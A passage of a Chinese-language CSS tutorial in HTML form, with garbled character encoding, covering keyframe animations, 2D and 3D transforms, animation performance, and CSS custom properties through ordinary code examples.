title="å…³é”®å¸§åŠ¨ç”»ï¼ˆ@keyframesï¼‰"></a>å…³é”®å¸§åŠ¨ç”»ï¼ˆ@keyframesï¼‰</h3><p>å®šä¹‰å¤æ‚çš„å¤šé˜¶æ®µåŠ¨ç”»ï¼Œé€‚åˆéœ€è¦ç²¾ç¡®æ§åˆ¶çš„åœºæ™¯ã€‚</p><p><strong>åŸºæœ¬è¯­æ³•</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@keyframes</span> slideIn &#123;<br>  <span class="hljs-selector-tag">from</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>); &#125;<br>  <span class="hljs-selector-tag">to</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0</span>); &#125;<br>&#125;<br><br><span class="hljs-comment">/* æˆ–ç™¾åˆ†æ¯”æ§åˆ¶ */</span><br><span class="hljs-keyword">@keyframes</span> pulse &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>; &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åŠ¨ç”»å±æ€§ï¼ˆanimationï¼‰</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">animation</span>: <br>    [name] [duration] [timing-function] [delay] <br>    [iteration-count] [direction] [fill-mode];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å‚æ•°æ‰©å±•ï¼š<ul><li>iteration-countï¼šæ’­æ”¾æ¬¡æ•°ï¼ˆinfiniteè¡¨ç¤ºæ— é™å¾ªç¯ï¼‰</li><li>directionï¼šalternateï¼ˆå¾€è¿”æ’­æ”¾ï¼‰</li><li>fill-modeï¼šforwardsï¼ˆä¿ç•™æœ€åä¸€å¸§ï¼‰</li></ul></li></ul><p><strong>è§†é¢‘åŠ è½½åŠ¨ç”»æ¡ˆä¾‹</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@keyframes</span> dotPulse &#123;<br>  <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1</span>); <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.5</span>); <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.7</span>; &#125;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span> &#123;<br>  <span class="hljs-attribute">animation</span>: dotPulse <span class="hljs-number">1.5s</span> infinite ease-in-out;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">0.2s</span>;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>) &#123;<br>  <span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">0.4s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¯åŠ¨ç”»å±æ€§æ€§èƒ½æ’è¡Œ</strong></p><table><thead><tr><th align="left">å±æ€§ç±»å‹</th><th align="left">æ€§èƒ½å½±å“</th><th align="left">æ¨èåœºæ™¯</th></tr></thead><tbody><tr><td align="left">transform</td><td align="left">æœ€ä¼˜</td><td align="left">ä½ç§»&#x2F;æ—‹è½¬&#x2F;ç¼©æ”¾</td></tr><tr><td align="left">opacity</td><td align="left">ä¼˜</td><td align="left">æ·¡å…¥æ·¡å‡º</td></tr><tr><td align="left">color</td><td align="left">ä¸­</td><td align="left">éé«˜é¢‘å˜åŒ–</td></tr><tr><td align="left">width&#x2F;height</td><td align="left">å·®</td><td align="left">é¿å…åœ¨åŠ¨ç”»ä¸­ä½¿ç”¨</td></tr></tbody></table><h2 id="3-4-å˜å½¢ï¼ˆtransformï¼šrotateã€scaleã€translateï¼‰"><a href="#3-4-å˜å½¢ï¼ˆtransformï¼šrotateã€scaleã€translateï¼‰" class="headerlink" title="3.4 å˜å½¢ï¼ˆtransformï¼šrotateã€scaleã€translateï¼‰"></a>3.4 å˜å½¢ï¼ˆtransformï¼šrotateã€scaleã€translateï¼‰</h2><h3 id="transform-æ ¸å¿ƒåŠŸèƒ½æ€»è§ˆ"><a href="#transform-æ ¸å¿ƒåŠŸèƒ½æ€»è§ˆ" class="headerlink" title="transform æ ¸å¿ƒåŠŸèƒ½æ€»è§ˆ"></a>transform æ ¸å¿ƒåŠŸèƒ½æ€»è§ˆ</h3><p>åœ¨ä¸å½±å“æ–‡æ¡£æµçš„å‰æä¸‹ï¼Œå¯¹å…ƒç´ è¿›è¡Œè§†è§‰å˜å½¢ï¼ŒåŒ…å«å››å¤§ç±»æ“ä½œï¼š</p><table><thead><tr><th align="left">å˜å½¢ç±»å‹</th><th align="left">å‡½æ•°ç¤ºä¾‹</th><th align="left">å˜å½¢åŸºå‡†ç‚¹ï¼ˆé»˜è®¤ï¼‰</th></tr></thead><tbody><tr><td align="left">æ—‹è½¬ï¼ˆRotateï¼‰</td><td align="left">rotate(45deg)</td><td align="left">å…ƒç´ ä¸­å¿ƒ</td></tr><tr><td align="left">ç¼©æ”¾ï¼ˆScaleï¼‰</td><td align="left">scale(1.2)</td><td align="left">å…ƒç´ ä¸­å¿ƒ</td></tr><tr><td align="left">ä½ç§»ï¼ˆTranslateï¼‰</td><td align="left">translate(20px, 50px)</td><td align="left">å…ƒç´ è‡ªèº«ä½ç½®</td></tr><tr><td align="left">å€¾æ–œï¼ˆSkewï¼‰</td><td align="left">skew(15deg)</td><td align="left">å…ƒç´ ä¸­å¿ƒ</td></tr></tbody></table><h3 id="äºŒç»´å˜å½¢è¯¦è§£"><a href="#äºŒç»´å˜å½¢è¯¦è§£" class="headerlink" title="äºŒç»´å˜å½¢è¯¦è§£"></a>äºŒç»´å˜å½¢è¯¦è§£</h3><p>ï¼ˆ1ï¼‰æ—‹è½¬ - rotate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-rotate</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">30deg</span>); <span class="hljs-comment">/* é¡ºæ—¶é’ˆæ—‹è½¬ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›é˜¶æ§åˆ¶ï¼š</p><ul><li>rotateX(45deg)ï¼šç»•Xè½´æ—‹è½¬ï¼ˆ3Dæ•ˆæœï¼‰</li><li>rotateY(180deg)ï¼šç»•Yè½´æ—‹è½¬ï¼ˆé•œé¢ç¿»è½¬ï¼‰</li><li>rotateZ(90deg)ï¼šç­‰åŒäºrotate()ï¼ˆZè½´å‚ç›´äºå±å¹•ï¼‰</li></ul><p>ï¼ˆ2ï¼‰ç¼©æ”¾ - scale</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-scale</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.5</span>); <span class="hljs-comment">/* æ•´ä½“æ”¾å¤§1.5å€ */</span><br>  <span class="hljs-comment">/* æˆ–åˆ†å¼€æ§åˆ¶ */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scaleX</span>(<span class="hljs-number">1.2</span>) <span class="hljs-built_in">scaleY</span>(<span class="hljs-number">0.8</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>é™·é˜±ï¼š</p><ul><li>ç¼©æ”¾ä¸å½±å“å¸ƒå±€ï¼ˆç›¸é‚»å…ƒç´ ä¸ä¼šè‡ªåŠ¨é¿è®©ï¼‰</li><li>å¯èƒ½å¼•å‘æ–‡å­—æ¨¡ç³Šï¼ˆéœ€é…åˆtransform-originè°ƒæ•´åŸºå‡†ç‚¹ï¼‰</li></ul><p>ï¼ˆ3ï¼‰ä½ç§» - translate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-translate</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">50%</span>, -<span class="hljs-number">20px</span>); <span class="hljs-comment">/* æ°´å¹³50% å‚ç›´-20px */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç™¾åˆ†æ¯”è®¡ç®—åŸºå‡†ï¼š</p><ul><li>translateX(50%)ï¼šåŸºäºå…ƒç´ è‡ªèº«å®½åº¦</li><li>left: 50%ï¼šåŸºäºçˆ¶å®¹å™¨å®½åº¦</li></ul><p>ï¼ˆ4ï¼‰å€¾æ–œ - skew</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-skew</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">skew</span>(<span class="hljs-number">15deg</span>, -<span class="hljs-number">10deg</span>); <span class="hljs-comment">/* Xè½´15Â° Yè½´-10Â° */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åº”ç”¨åœºæ™¯ï¼šåˆ›å»ºå¹³è¡Œå››è¾¹å½¢æŒ‰é’®ã€æ–œåˆ‡ banner æ•ˆæœ</p><h3 id="å˜å½¢å±æ€§æ€§èƒ½æ’åº"><a href="#å˜å½¢å±æ€§æ€§èƒ½æ’åº" class="headerlink" title="å˜å½¢å±æ€§æ€§èƒ½æ’åº"></a>å˜å½¢å±æ€§æ€§èƒ½æ’åº</h3><table><thead><tr><th align="left">å˜å½¢ç±»å‹</th><th align="left">æ€§èƒ½å½±å“</th><th align="left">æ¨èåœºæ™¯</th></tr></thead><tbody><tr><td align="left">translate</td><td align="left">æœ€ä¼˜</td><td align="left">ä½ç§»åŠ¨ç”»</td></tr><tr><td align="left">scale</td><td align="left">ä¼˜</td><td align="left">ç¼©æ”¾æ•ˆæœ</td></tr><tr><td align="left">rotate</td><td align="left">ä¸­</td><td align="left">é¿å…é«˜é¢‘æ—‹è½¬</td></tr><tr><td align="left">filter+å˜å½¢</td><td align="left">å·®</td><td align="left">è°¨æ…ç»„åˆä½¿ç”¨</td></tr></tbody></table><h2 id="3-5-3D-å˜æ¢ï¼ˆperspectiveã€transform-styleï¼‰"><a href="#3-5-3D-å˜æ¢ï¼ˆperspectiveã€transform-styleï¼‰" class="headerlink" title="3.5 3D å˜æ¢ï¼ˆperspectiveã€transform-styleï¼‰"></a>3.5 3D å˜æ¢ï¼ˆperspectiveã€transform-styleï¼‰</h2><h3 id="3D-å˜æ¢æ ¸å¿ƒæ¦‚å¿µ"><a href="#3D-å˜æ¢æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="3D å˜æ¢æ ¸å¿ƒæ¦‚å¿µ"></a>3D å˜æ¢æ ¸å¿ƒæ¦‚å¿µ</h3><p>CSS 3D å˜æ¢é€šè¿‡æ¨¡æ‹Ÿä¸‰ç»´åæ ‡ç³»ï¼ˆX&#x2F;Y&#x2F;Z è½´ï¼‰å®ç°ç«‹ä½“æ•ˆæœï¼Œå…³é”®ä¾èµ–ä¸¤ä¸ªå±æ€§ï¼š</p><table><thead><tr><th align="left">å±æ€§</th><th align="left">ä½œç”¨</th><th align="left">é»˜è®¤å€¼</th></tr></thead><tbody><tr><td align="left">perspective</td><td align="left">å®šä¹‰è§‚å¯Ÿè€…ä¸3Dç©ºé—´çš„è§†è§‰è·ç¦»</td><td align="left">none</td></tr><tr><td align="left">transform-style</td><td align="left">å†³å®šå­å…ƒç´ æ˜¯å¦ä¿ç•™3Då˜æ¢ç‰¹æ€§</td><td align="left">flat</td></tr></tbody></table><h3 id="perspective-æ™¯æ·±æ§åˆ¶"><a href="#perspective-æ™¯æ·±æ§åˆ¶" class="headerlink" title="perspective æ™¯æ·±æ§åˆ¶"></a>perspective æ™¯æ·±æ§åˆ¶</h3><p>åŸç†ï¼šæ¨¡æ‹Ÿäººçœ¼åˆ°3Dç‰©ä½“çš„è·ç¦»ï¼Œæ•°å€¼è¶Šå°é€è§†æ•ˆæœè¶Šå¼ºã€‚</p><p><strong>åŸºç¡€ç”¨æ³•</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">perspective</span>: <span class="hljs-number">1000px</span>; <span class="hljs-comment">/* æ¨èå€¼ï¼š500-2000px */</span><br>&#125;<br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">45deg</span>); <span class="hljs-comment">/* æ­¤æ—¶ä¼šæœ‰3Dé€è§†æ•ˆæœ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸¤ç§è®¾ç½®æ–¹å¼</strong></p><p>ï¼ˆ1ï¼‰åœºæ™¯æ™¯æ·±ï¼ˆçˆ¶å…ƒç´ è®¾ç½®ï¼Œå½±å“æ‰€æœ‰å­å…ƒç´ ï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.scene</span> &#123;<br>  <span class="hljs-attribute">perspective</span>: <span class="hljs-number">1200px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ä¸ªä½“æ™¯æ·±ï¼ˆå…ƒç´ è‡ªèº«è®¾ç½®ï¼Œä»…å½±å“å½“å‰å…ƒç´ ï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">perspective</span>(<span class="hljs-number">1200px</span>) <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">45deg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–</strong></p><ul><li>é¿å…åŠ¨æ€ä¿®æ”¹perspectiveï¼ˆè§¦å‘é‡æ’ï¼‰</li><li>ç§»åŠ¨ç«¯å»ºè®®å€¼â‰¥800pxï¼ˆé˜²æ­¢è¿‡åº¦å˜å½¢ï¼‰</li></ul><h3 id="transform-style-3D-ç©ºé—´ç»§æ‰¿"><a href="#transform-style-3D-ç©ºé—´ç»§æ‰¿" class="headerlink" title="transform-style 3D ç©ºé—´ç»§æ‰¿"></a>transform-style 3D ç©ºé—´ç»§æ‰¿</h3><p>æ§åˆ¶å­å…ƒç´ æ˜¯å¦åœ¨ç‹¬ç«‹ 3D ç©ºé—´ä¸­æ¸²æŸ“ï¼š</p><table><thead><tr><th align="left">å€¼</th><th align="left">æ•ˆæœ</th><th align="left">åº”ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">flat</td><td align="left">å­å…ƒç´ è¢«å‹æ‰åˆ°2Då¹³é¢ï¼ˆé»˜è®¤ï¼‰</td><td align="left">æ™®é€šå˜å½¢</td></tr><tr><td align="left">preserve-3d</td><td align="left">å­å…ƒç´ ä¿æŒ3Dç©ºé—´å…³ç³»</td><td align="left">å¤æ‚3Dç»„åˆä½“</td></tr></tbody></table><p><strong>å…¸å‹æ¡ˆä¾‹ï¼šç«‹æ–¹ä½“åˆ¶ä½œ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;cube&quot;&gt;<br>  &lt;div class=&quot;face front&quot;&gt;Front&lt;/div&gt;<br>  &lt;div class=&quot;face back&quot;&gt;Back&lt;/div&gt;<br>  &lt;!-- å…¶ä»–4ä¸ªé¢ --&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.cube</span> &#123;<br>  <span class="hljs-attribute">transform-style</span>: preserve-<span class="hljs-number">3</span>d;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">15deg</span>) <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">30deg</span>);<br>&#125;<br><span class="hljs-selector-class">.face</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<br>&#125;<br><span class="hljs-selector-class">.front</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">100px</span>); &#125;<br><span class="hljs-selector-class">.back</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">180deg</span>) <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">100px</span>); &#125;<br><span class="hljs-comment">/* å…¶ä»–é¢ç±»ä¼¼ */</span><br></code></pre></td></tr></table></figure><h3 id="3D-å˜æ¢å‡½æ•°è¿›é˜¶"><a href="#3D-å˜æ¢å‡½æ•°è¿›é˜¶" class="headerlink" title="3D å˜æ¢å‡½æ•°è¿›é˜¶"></a>3D å˜æ¢å‡½æ•°è¿›é˜¶</h3><p><strong>ä¸‰ç»´ä½ç§»</strong></p><table><thead><tr><th align="left">å‡½æ•°</th><th align="left">è½´æ–¹å‘</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">translateZ(z)</td><td align="left">å‚ç›´äºå±å¹•ï¼ˆè¿œè¿‘ï¼‰</td><td align="left">translateZ(50px)</td></tr><tr><td align="left">translate3d(x,y,z)</td><td align="left">ä¸‰ç»´å¤åˆä½ç§»</td><td align="left">translate3d(0, 10%, 20px)</td></tr></tbody></table><p><strong>ä¸‰ç»´æ—‹è½¬</strong></p><table><thead><tr><th align="left">å‡½æ•°</th><th align="left">æ—‹è½¬è½´</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">rotateX(angle)</td><td align="left">æ°´å¹³è½´ï¼ˆä¸Šä¸‹ç¿»è½¬ï¼‰</td><td align="left">rotateX(45deg)</td></tr><tr><td align="left">rotateY(angle)</td><td align="left">å‚ç›´è½´ï¼ˆå·¦å³ç¿»è½¬ï¼‰</td><td align="left">rotateY(180deg)</td></tr><tr><td align="left">rotate3d(x,y,z,a)</td><td align="left">è‡ªå®šä¹‰æ—‹è½¬è½´</td><td align="left">rotate3d(1,1,0,45deg)</td></tr></tbody></table><h3 id="æ€§èƒ½ä¼˜åŒ–"><a href="#æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–"></a>æ€§èƒ½ä¼˜åŒ–</h3><p>ï¼ˆ1ï¼‰å¤åˆåŠ¨ç”»ç­–ç•¥</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* é”™è¯¯ç¤ºèŒƒï¼šè¿ç»­ä¿®æ”¹ä¸åŒå±æ€§ */</span><br><span class="hljs-keyword">@keyframes</span> bad-animation &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">0</span>); &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">100px</span>); &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">180deg</span>); &#125;<br>&#125;<br><br><span class="hljs-comment">/* æ­£ç¡®åšæ³•ï¼šä¿æŒç›¸åŒå˜æ¢å±æ€§ */</span><br><span class="hljs-keyword">@keyframes</span> good-animation &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">0</span>) <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0</span>); &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">180deg</span>) <span class="hljs-built_in">translateY</span>(<span class="hljs-number">100px</span>); &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬å››ç« ï¼šCSS-é«˜çº§ç‰¹æ€§"><a href="#ç¬¬å››ç« ï¼šCSS-é«˜çº§ç‰¹æ€§" class="headerlink" title="ç¬¬å››ç« ï¼šCSS é«˜çº§ç‰¹æ€§"></a>ç¬¬å››ç« ï¼šCSS é«˜çº§ç‰¹æ€§</h1><h2 id="4-1-å˜é‡ï¼ˆCSS-Custom-Propertiesï¼‰"><a href="#4-1-å˜é‡ï¼ˆCSS-Custom-Propertiesï¼‰" class="headerlink" title="4.1 å˜é‡ï¼ˆCSS Custom Propertiesï¼‰"></a>4.1 å˜é‡ï¼ˆCSS Custom Propertiesï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µä¸è¯­æ³•"><a href="#åŸºç¡€æ¦‚å¿µä¸è¯­æ³•" class="headerlink" title="åŸºç¡€æ¦‚å¿µä¸è¯­æ³•"></a>åŸºç¡€æ¦‚å¿µä¸è¯­æ³•</h3><p>CSS å˜é‡ï¼ˆåˆæˆè‡ªå®šä¹‰å±æ€§ï¼‰æ˜¯ CSS çš„åŠ¨æ€å­˜å‚¨æœºåˆ¶ï¼Œå…·æœ‰çº§è”ç»§æ‰¿ç‰¹æ€§</p><p><strong>å®šä¹‰ä¸ä½¿ç”¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* å®šä¹‰å˜é‡ï¼ˆå¸¦--å‰ç¼€ï¼‰ */</span><br><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#4285f4</span>;<br>  <span class="hljs-attr">--spacing-unit</span>: <span class="hljs-number">8px</span>;<br>&#125;<br><br><span class="hljs-comment">/* ä½¿ç”¨å˜é‡ï¼ˆé€šè¿‡var()å‡½æ•°ï¼‰ */</span><br><span class="hljs-selector-class">.button</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--primary-color);<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-built_in">var</span>(--spacing-unit) <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--spacing-unit) * <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä½œç”¨åŸŸè§„åˆ™</strong></p><ul><li>å…¨å±€å˜é‡ï¼šå®šä¹‰åœ¨ <code>:root</code> é€‰æ‹©å™¨å†…</li><li>å±€éƒ¨å˜é‡ï¼šå®šä¹‰åœ¨ç‰¹å®šé€‰æ‹©å™¨å†…</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attr">--card-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>); <span class="hljs-comment">/* ä»….cardå†…æœ‰æ•ˆ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ ¸å¿ƒç‰¹æ€§è§£æ"><a href="#æ ¸å¿ƒç‰¹æ€§è§£æ" class="headerlink" title="æ ¸å¿ƒç‰¹æ€§è§£æ"></a>æ ¸å¿ƒç‰¹æ€§è§£æ</h3><p><strong>åŠ¨æ€è®¡ç®—èƒ½åŠ›</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--base-size</span>: <span class="hljs-number">16px</span>;<br>  <span class="hljs-attr">--h1-size</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--base-size) * <span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-selector-tag">h1</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-built_in">var</span>(--h1-size); &#125;<br></code></pre></td></tr></table></figure><p><strong>å›é€€æœºåˆ¶</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--undefined-var, <span class="hljs-number">#f00</span>); <span class="hljs-comment">/* å˜é‡ä¸å­˜åœ¨æ—¶ä½¿ç”¨#f00 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç±»å‹çµæ´»æ€§</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--theme-gradient</span>: <span class="hljs-built_in">linear-gradient</span>(to right, <span class="hljs-number">#ff8a00</span>, <span class="hljs-number">#da1b60</span>);<br>  <span class="hljs-attr">--mobile-breakpoint</span>: <span class="hljs-number">768px</span>;<br>  <span class="hljs-attr">--transition-config</span>: <span class="hljs-number">0.3s</span> ease-in-out;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åº”ç”¨åœºæ™¯ç¤ºä¾‹ï¼šä¸»é¢˜åˆ‡æ¢"><a href="#åº”ç”¨åœºæ™¯ç¤ºä¾‹ï¼šä¸»é¢˜åˆ‡æ¢" class="headerlink" title="åº”ç”¨åœºæ™¯ç¤ºä¾‹ï¼šä¸»é¢˜åˆ‡æ¢"></a>åº”ç”¨åœºæ™¯ç¤ºä¾‹ï¼šä¸»é¢˜åˆ‡æ¢</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* å®šä¹‰ä¸»é¢˜å˜é‡ */</span><br><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span 